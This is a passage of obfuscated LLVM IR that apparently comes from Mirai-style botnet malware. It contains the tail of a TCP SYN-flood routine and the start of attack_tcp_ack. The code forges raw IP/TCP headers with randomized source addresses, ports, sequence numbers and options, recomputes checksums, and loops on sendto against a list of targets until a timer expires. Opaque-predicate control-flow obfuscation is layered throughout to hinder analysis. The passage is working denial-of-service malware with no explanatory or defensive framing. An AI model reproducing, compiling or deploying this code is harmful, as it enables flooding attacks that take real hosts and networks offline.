  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 2
  store i32 %209, i32* %211, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -241
  %216 = or i16 %215, 160
  store i16 %216, i16* %213, align 4
  %217 = load i8, i8* %22, align 1
  %218 = sext i8 %217 to i16
  %219 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 4
  %221 = load i16, i16* %220, align 4
  %222 = and i16 %218, 1
  %223 = shl i16 %222, 13
  %224 = and i16 %221, -8193
  %225 = or i16 %224, %223
  store i16 %225, i16* %220, align 4
  %226 = load i8, i8* %23, align 1
  %227 = sext i8 %226 to i16
  %228 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %227, 1
  %232 = shl i16 %231, 12
  %233 = and i16 %230, -4097
  %234 = or i16 %233, %232
  store i16 %234, i16* %229, align 4
  %235 = load i8, i8* %24, align 1
  %236 = sext i8 %235 to i16
  %237 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = and i16 %236, 1
  %241 = shl i16 %240, 11
  %242 = and i16 %239, -2049
  %243 = or i16 %242, %241
  store i16 %243, i16* %238, align 4
  %244 = load i8, i8* %25, align 1
  %245 = sext i8 %244 to i16
  %246 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = and i16 %245, 1
  %250 = shl i16 %249, 10
  %251 = and i16 %248, -1025
  %252 = or i16 %251, %250
  store i16 %252, i16* %247, align 4
  %253 = load i8, i8* %26, align 1
  %254 = sext i8 %253 to i16
  %255 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = and i16 %254, 1
  %259 = shl i16 %258, 9
  %260 = and i16 %257, -513
  %261 = or i16 %260, %259
  store i16 %261, i16* %256, align 4
  %262 = load i8, i8* %27, align 1
  %263 = sext i8 %262 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = and i16 %263, 1
  %268 = shl i16 %267, 8
  %269 = and i16 %266, -257
  %270 = or i16 %269, %268
  store i16 %270, i16* %265, align 4
  %271 = load i8*, i8** %32, align 8
  %272 = getelementptr inbounds i8, i8* %271, i32 1
  store i8* %272, i8** %32, align 8
  store i8 2, i8* %271, align 1
  %273 = load i8*, i8** %32, align 8
  %274 = getelementptr inbounds i8, i8* %273, i32 1
  store i8* %274, i8** %32, align 8
  store i8 4, i8* %273, align 1
  %275 = call i32 @rand_next()
  %276 = and i32 %275, 15
  %277 = add i32 1400, %276
  %278 = trunc i32 %277 to i16
  %279 = call zeroext i16 @htons(i16 zeroext %278) #7
  %280 = load i8*, i8** %32, align 8
  %281 = bitcast i8* %280 to i16*
  store i16 %279, i16* %281, align 2
  %282 = load i8*, i8** %32, align 8
  %283 = getelementptr inbounds i8, i8* %282, i64 2
  store i8* %283, i8** %32, align 8
  %284 = load i8*, i8** %32, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %32, align 8
  store i8 4, i8* %284, align 1
  %286 = load i8*, i8** %32, align 8
  %287 = getelementptr inbounds i8, i8* %286, i32 1
  store i8* %287, i8** %32, align 8
  store i8 2, i8* %286, align 1
  %288 = load i8*, i8** %32, align 8
  %289 = getelementptr inbounds i8, i8* %288, i32 1
  store i8* %289, i8** %32, align 8
  store i8 8, i8* %288, align 1
  %290 = load i8*, i8** %32, align 8
  %291 = getelementptr inbounds i8, i8* %290, i32 1
  store i8* %291, i8** %32, align 8
  store i8 10, i8* %290, align 1
  %292 = call i32 @rand_next()
  %293 = load i8*, i8** %32, align 8
  %294 = bitcast i8* %293 to i32*
  store i32 %292, i32* %294, align 4
  %295 = load i8*, i8** %32, align 8
  %296 = getelementptr inbounds i8, i8* %295, i64 4
  store i8* %296, i8** %32, align 8
  %297 = load i8*, i8** %32, align 8
  %298 = bitcast i8* %297 to i32*
  store i32 0, i32* %298, align 4
  %299 = load i8*, i8** %32, align 8
  %300 = getelementptr inbounds i8, i8* %299, i64 4
  store i8* %300, i8** %32, align 8
  %301 = load i8*, i8** %32, align 8
  %302 = getelementptr inbounds i8, i8* %301, i32 1
  store i8* %302, i8** %32, align 8
  store i8 1, i8* %301, align 1
  %303 = load i8*, i8** %32, align 8
  %304 = getelementptr inbounds i8, i8* %303, i32 1
  store i8* %304, i8** %32, align 8
  store i8 3, i8* %303, align 1
  %305 = load i8*, i8** %32, align 8
  %306 = getelementptr inbounds i8, i8* %305, i32 1
  store i8* %306, i8** %32, align 8
  store i8 3, i8* %305, align 1
  %307 = load i8*, i8** %32, align 8
  %308 = getelementptr inbounds i8, i8* %307, i32 1
  store i8* %308, i8** %32, align 8
  store i8 6, i8* %307, align 1
  br label %309

; <label>:309:                                    ; preds = %184
  %310 = load i32, i32* %11, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %11, align 4
  br label %132

; <label>:312:                                    ; preds = %132
  %313 = load i32, i32* @x.23
  %314 = load i32, i32* @y.24
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %312
  %321 = load i32, i32* @x.23
  %322 = load i32, i32* @y.24
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %329

; <label>:329:                                    ; preds = %610, %originalBBpart24
  %330 = load i32, i32* @x.23
  %331 = load i32, i32* @y.24
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %329
  store i32 0, i32* %11, align 4
  %338 = load i32, i32* @x.23
  %339 = load i32, i32* @y.24
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %346

; <label>:346:                                    ; preds = %originalBBpart248, %originalBBpart28
  %347 = load i32, i32* %11, align 4
  %348 = load i8, i8* %7, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp slt i32 %347, %349
  br i1 %350, label %351, label %604

; <label>:351:                                    ; preds = %346
  %352 = load i8**, i8*** %13, align 8
  %353 = load i32, i32* %11, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds i8*, i8** %352, i64 %354
  %356 = load i8*, i8** %355, align 8
  store i8* %356, i8** %33, align 8
  %357 = load i8*, i8** %33, align 8
  %358 = bitcast i8* %357 to %struct.iphdr*
  store %struct.iphdr* %358, %struct.iphdr** %34, align 8
  %359 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i64 1
  %361 = bitcast %struct.iphdr* %360 to %struct.tcphdr*
  store %struct.tcphdr* %361, %struct.tcphdr** %35, align 8
  %362 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %363 = load i32, i32* %11, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 2
  %367 = load i8, i8* %366, align 4
  %368 = zext i8 %367 to i32
  %369 = icmp slt i32 %368, 32
  br i1 %369, label %370, label %391

; <label>:370:                                    ; preds = %351
  %371 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %372 = load i32, i32* %11, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 1
  %376 = load i32, i32* %375, align 4
  %377 = call i32 @ntohl(i32 %376) #7
  %378 = call i32 @rand_next()
  %379 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %380 = load i32, i32* %11, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 2
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = lshr i32 %378, %385
  %387 = add i32 %377, %386
  %388 = call i32 @htonl(i32 %387) #7
  %389 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 9
  store i32 %388, i32* %390, align 4
  br label %391

; <label>:391:                                    ; preds = %370, %351
  %392 = load i32, i32* %28, align 4
  %393 = icmp eq i32 %392, -1
  br i1 %393, label %394, label %398

; <label>:394:                                    ; preds = %391
  %395 = call i32 @rand_next()
  %396 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 8
  store i32 %395, i32* %397, align 4
  br label %398

; <label>:398:                                    ; preds = %394, %391
  %399 = load i16, i16* %15, align 2
  %400 = zext i16 %399 to i32
  %401 = icmp eq i32 %400, 65535
  br i1 %401, label %402, label %424

; <label>:402:                                    ; preds = %398
  %403 = load i32, i32* @x.23
  %404 = load i32, i32* @y.24
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %402
  %411 = call i32 @rand_next()
  %412 = and i32 %411, 65535
  %413 = trunc i32 %412 to i16
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 3
  store i16 %413, i16* %415, align 4
  %416 = load i32, i32* @x.23
  %417 = load i32, i32* @y.24
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br label %424

; <label>:424:                                    ; preds = %originalBBpart213, %398
  %425 = load i32, i32* @x.23
  %426 = load i32, i32* @y.24
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %424
  %433 = load i16, i16* %18, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  %436 = load i32, i32* @x.23
  %437 = load i32, i32* @y.24
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %435, label %444, label %450

; <label>:444:                                    ; preds = %originalBBpart217
  %445 = call i32 @rand_next()
  %446 = and i32 %445, 65535
  %447 = trunc i32 %446 to i16
  %448 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 0
  store i16 %447, i16* %449, align 4
  br label %450

; <label>:450:                                    ; preds = %444, %originalBBpart217
  %451 = load i16, i16* %19, align 2
  %452 = zext i16 %451 to i32
  %453 = icmp eq i32 %452, 65535
  br i1 %453, label %454, label %460

; <label>:454:                                    ; preds = %450
  %455 = call i32 @rand_next()
  %456 = and i32 %455, 65535
  %457 = trunc i32 %456 to i16
  %458 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %459 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %458, i32 0, i32 1
  store i16 %457, i16* %459, align 2
  br label %460

; <label>:460:                                    ; preds = %454, %450
  %461 = load i32, i32* @x.23
  %462 = load i32, i32* @y.24
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %460
  %469 = load i32, i32* %20, align 4
  %470 = icmp eq i32 %469, 65535
  %471 = load i32, i32* @x.23
  %472 = load i32, i32* @y.24
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %470, label %479, label %483

; <label>:479:                                    ; preds = %originalBBpart221
  %480 = call i32 @rand_next()
  %481 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 2
  store i32 %480, i32* %482, align 4
  br label %483

; <label>:483:                                    ; preds = %479, %originalBBpart221
  %484 = load i32, i32* %21, align 4
  %485 = icmp eq i32 %484, 65535
  br i1 %485, label %486, label %506

; <label>:486:                                    ; preds = %483
  %487 = load i32, i32* @x.23
  %488 = load i32, i32* @y.24
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %486
  %495 = call i32 @rand_next()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 3
  store i32 %495, i32* %497, align 4
  %498 = load i32, i32* @x.23
  %499 = load i32, i32* @y.24
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %506

; <label>:506:                                    ; preds = %originalBBpart225, %483
  %507 = load i32, i32* @x.23
  %508 = load i32, i32* @y.24
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %506
  %515 = load i8, i8* %22, align 1
  %516 = icmp ne i8 %515, 0
  %517 = load i32, i32* @x.23
  %518 = load i32, i32* @y.24
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %516, label %525, label %531

; <label>:525:                                    ; preds = %originalBBpart229
  %526 = call i32 @rand_next()
  %527 = and i32 %526, 65535
  %528 = trunc i32 %527 to i16
  %529 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 7
  store i16 %528, i16* %530, align 2
  br label %531

; <label>:531:                                    ; preds = %525, %originalBBpart229
  %532 = load i32, i32* @x.23
  %533 = load i32, i32* @y.24
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %531
  %540 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 7
  store i16 0, i16* %541, align 2
  %542 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %543 = bitcast %struct.iphdr* %542 to i16*
  %544 = call zeroext i16 @checksum_generic(i16* %543, i32 20)
  %545 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %546 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %545, i32 0, i32 7
  store i16 %544, i16* %546, align 2
  %547 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 6
  store i16 0, i16* %548, align 4
  %549 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %550 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %551 = bitcast %struct.tcphdr* %550 to i8*
  %552 = call zeroext i16 @htons(i16 zeroext 40) #7
  %553 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %549, i8* %551, i16 zeroext %552, i32 40)
  %554 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 6
  store i16 %553, i16* %555, align 4
  %556 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 1
  %558 = load i16, i16* %557, align 2
  %559 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %560 = load i32, i32* %11, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %563, i32 0, i32 1
  store i16 %558, i16* %564, align 2
  %565 = load i32, i32* %12, align 4
  %566 = load i8*, i8** %33, align 8
  %567 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %568 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %569 = load i32, i32* %11, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = bitcast %struct.sockaddr_in* %572 to %struct.sockaddr*
  store %struct.sockaddr* %573, %struct.sockaddr** %567, align 8
  %574 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %575 = load %struct.sockaddr*, %struct.sockaddr** %574, align 8
  %576 = call i64 @sendto(i32 %565, i8* %566, i64 60, i32 16384, %struct.sockaddr* %575, i32 16)
  %577 = load i32, i32* @x.23
  %578 = load i32, i32* @y.24
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %585

; <label>:585:                                    ; preds = %originalBBpart233
  %586 = load i32, i32* @x.23
  %587 = load i32, i32* @y.24
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %585
  %594 = load i32, i32* %11, align 4
  %595 = add nsw i32 %594, 1
  store i32 %595, i32* %11, align 4
  %596 = load i32, i32* @x.23
  %597 = load i32, i32* @y.24
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBBpart248, label %originalBB35alteredBB

originalBBpart248:                                ; preds = %originalBB35
  br label %346

; <label>:604:                                    ; preds = %346
  %605 = call i64 @time(i64* null) #6
  %606 = load i32, i32* %29, align 4
  %607 = sext i32 %606 to i64
  %608 = icmp sgt i64 %605, %607
  br i1 %608, label %609, label %610

; <label>:609:                                    ; preds = %604
  br label %611

; <label>:610:                                    ; preds = %604
  br label %329

; <label>:611:                                    ; preds = %609, %112, %106
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %115
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %312
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %329
  store i32 0, i32* %11, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %402
  %612 = call i32 @rand_next()
  %_ = sub i32 0, %612
  %gen = add i32 %_, 65535
  %_11 = shl i32 %612, 65535
  %613 = and i32 %612, 65535
  %614 = trunc i32 %613 to i16
  %615 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %616 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %615, i32 0, i32 3
  store i16 %614, i16* %616, align 4
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %424
  %617 = load i16, i16* %18, align 2
  %618 = zext i16 %617 to i32
  %619 = icmp eq i32 %618, 65535
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %460
  %620 = load i32, i32* %20, align 4
  %621 = icmp eq i32 %620, 65535
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %486
  %622 = call i32 @rand_next()
  %623 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %624 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %623, i32 0, i32 3
  store i32 %622, i32* %624, align 4
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %506
  %625 = load i8, i8* %22, align 1
  %626 = icmp ne i8 %625, 0
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %531
  %627 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %628 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %627, i32 0, i32 7
  store i16 0, i16* %628, align 2
  %629 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %630 = bitcast %struct.iphdr* %629 to i16*
  %631 = call zeroext i16 @checksum_generic(i16* %630, i32 20)
  %632 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %633 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %632, i32 0, i32 7
  store i16 %631, i16* %633, align 2
  %634 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 6
  store i16 0, i16* %635, align 4
  %636 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %637 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %638 = bitcast %struct.tcphdr* %637 to i8*
  %639 = call zeroext i16 @htons(i16 zeroext 40) #7
  %640 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %636, i8* %638, i16 zeroext %639, i32 40)
  %641 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %642 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %641, i32 0, i32 6
  store i16 %640, i16* %642, align 4
  %643 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %644 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %643, i32 0, i32 1
  %645 = load i16, i16* %644, align 2
  %646 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %647 = load i32, i32* %11, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %646, i64 %648
  %650 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %649, i32 0, i32 0
  %651 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %650, i32 0, i32 1
  store i16 %645, i16* %651, align 2
  %652 = load i32, i32* %12, align 4
  %653 = load i8*, i8** %33, align 8
  %654 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %655 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %656 = load i32, i32* %11, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %655, i64 %657
  %659 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %658, i32 0, i32 0
  %660 = bitcast %struct.sockaddr_in* %659 to %struct.sockaddr*
  store %struct.sockaddr* %660, %struct.sockaddr** %654, align 8
  %661 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %662 = load %struct.sockaddr*, %struct.sockaddr** %661, align 8
  %663 = call i64 @sendto(i32 %652, i8* %653, i64 60, i32 16384, %struct.sockaddr* %662, i32 16)
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %585
  %664 = load i32, i32* %11, align 4
  %_36 = sub i32 %664, 1
  %gen37 = mul i32 %_36, 1
  %_38 = sub i32 %664, 1
  %gen39 = mul i32 %_38, 1
  %_40 = shl i32 %664, 1
  %_41 = sub i32 %664, 1
  %gen42 = mul i32 %_41, 1
  %_43 = shl i32 %664, 1
  %_44 = shl i32 %664, 1
  %_45 = sub i32 0, %664
  %gen46 = add i32 %_45, 1
  %665 = add nsw i32 %664, 1
  store i32 %665, i32* %11, align 4
  br label %originalBB35
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
